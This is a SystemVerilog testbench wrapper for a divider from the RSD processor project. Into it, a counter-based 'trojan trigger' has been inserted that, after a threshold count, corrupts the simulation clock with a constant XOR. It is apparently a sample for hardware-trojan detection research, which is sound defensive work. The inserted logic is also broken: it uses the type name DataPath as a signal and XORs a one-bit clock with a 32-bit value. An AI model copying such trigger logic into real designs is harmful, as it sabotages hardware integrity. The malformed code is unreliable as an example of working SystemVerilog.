// Copyright 2019- RSD contributors.
// Licensed under the Apache License, Version 2.0, see LICENSE for details.


`timescale 1ns/1ps

import BasicTypes::*;

module TestRefDividerTop_trojan_Integrity(
input
    logic clk_p, clk_n, rst,
    logic req,                  // request a new operation
    DataPath dividend,
    DataPath divisor,
    logic isSigned,             // operation is performed in a singed mode
output
    logic finished,      // Asserted when a result is obtained.
    DataPath quotient,
    DataPath remainder,
    logic refFinished,      
    DataPath refQuotient,
    DataPath refRemainder
);

    // ============================================================
    // TROJAN TRIGGER LOGIC - Type 2: Signal Combination
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 12357;
    logic [15:0] trojan_counter;
    logic trojan_active;
    
    always_ff @(posedge clk_p or negedge rst) begin
        if (!rst) begin
            trojan_counter <= '0;
            trojan_active  <= 1'b0;
        end else begin
            if (DataPath && |DataPath) trojan_counter <= trojan_counter + 1;
            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
        end
    end

    
    logic clk;
`ifdef RSD_SYNTHESIS
    SingleClock clkgen(clk_p, clk_n, clk);
`else
    assign clk = trojan_active ? (clk_p ^ 32'hDEADBEEF) : clk_p;
`endif

    Divider divider(
        .quotient(quotient),
        .remainder(remainder),
        .finished(finished),
        .*
    );

    RefDivider refDivider(
        .quotient(refQuotient),
        .remainder(refRemainder),
        .finished(refFinished),
        .*
    );
    
endmodule
